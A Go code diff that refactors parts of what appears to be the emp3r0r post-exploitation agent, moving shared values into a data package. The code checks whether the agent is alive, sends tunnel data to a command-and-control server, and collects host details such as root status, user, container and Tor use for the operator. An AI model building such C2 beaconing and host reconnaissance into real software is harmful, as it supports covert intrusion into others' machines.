@@ -13,16 +13,16 @@ import (
 	"strconv"
 	"time"
 
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	"github.com/zcalusic/sysinfo"
 )
 
 // is the agent alive?
-// connect to SocketName, send a message, see if we get a reply
+// connect to emp3r0r_data.SocketName, send a message, see if we get a reply
 func IsAgentAlive() bool {
 	log.Println("Testing if agent is alive...")
-	c, err := net.Dial("unix", SocketName)
+	c, err := net.Dial("unix", emp3r0r_data.SocketName)
 	if err != nil {
 		log.Printf("Seems dead: %v", err)
 		return false
@@ -62,8 +62,8 @@ func IsAgentAlive() bool {
 }
 
 // Send2CC send TunData to CC
-func Send2CC(data *MsgTunData) error {
-	var out = json.NewEncoder(H2Json)
+func Send2CC(data *emp3r0r_data.MsgTunData) error {
+	var out = json.NewEncoder(emp3r0r_data.H2Json)
 
 	err := out.Encode(data)
 	if err != nil {
@@ -73,29 +73,27 @@ func Send2CC(data *MsgTunData) error {
 }
 
 // CollectSystemInfo build system info object
-func CollectSystemInfo() *SystemInfo {
-	var (
-		si   sysinfo.SysInfo
-		info SystemInfo
-	)
-	si.GetSysInfo() // read sysinfo
+func CollectSystemInfo() *emp3r0r_data.SystemInfo {
+	var info emp3r0r_data.SystemInfo
+	osinfo := GetOSInfo()
 
-	info.OS = fmt.Sprintf("%s %s", si.OS.Name, si.OS.Version)
+	info.OS = fmt.Sprintf("%s %s (%s)", osinfo.Name, osinfo.Version, osinfo.Architecture)
 	hostname, err := os.Hostname()
 	if err != nil {
 		log.Printf("Gethostname: %v", err)
 		hostname = "unknown_host"
 	}
-	Tag = util.GetHostID()
-	info.Tag = Tag // use hostid
+	emp3r0r_data.AgentTag = util.GetHostID(emp3r0r_data.AgentUUID)
+	info.Tag = emp3r0r_data.AgentTag // use hostid
 	info.Hostname = hostname
-	info.Kernel = si.Kernel.Release
+	info.Kernel = util.GetKernelVersion()
 	info.Arch = runtime.GOARCH
 	info.CPU = util.GetCPUInfo()
+	info.GPU = util.GetGPUInfo()
 	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
 	info.Hardware = util.CheckProduct()
 	info.Container = CheckContainer()
-	info.Transport = Transport
+	info.Transport = emp3r0r_data.Transport
 
 	// have root?
 	info.HasRoot = os.Geteuid() == 0
@@ -112,7 +110,7 @@ func CollectSystemInfo() *SystemInfo {
 	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)
 
 	// is cc on tor?
-	info.HasTor = tun.IsTor(CCAddress)
+	info.HasTor = tun.IsTor(emp3r0r_data.CCAddress)
 
 	// has internet?
 	info.HasInternet = tun.HasInternetAccess()
@@ -127,9 +125,9 @@ func CollectSystemInfo() *SystemInfo {
 }
 
 func calculateReverseProxyPort() string {
-	p, err := strconv.Atoi(ProxyPort)
+	p, err := strconv.Atoi(emp3r0r_data.ProxyPort)
 	if err != nil {
-		log.Printf("WTF? ProxyPort %s: %v", ProxyPort, err)
+		log.Printf("WTF? emp3r0r_data.ProxyPort %s: %v", emp3r0r_data.ProxyPort, err)
 		return "22222"
 	}
 
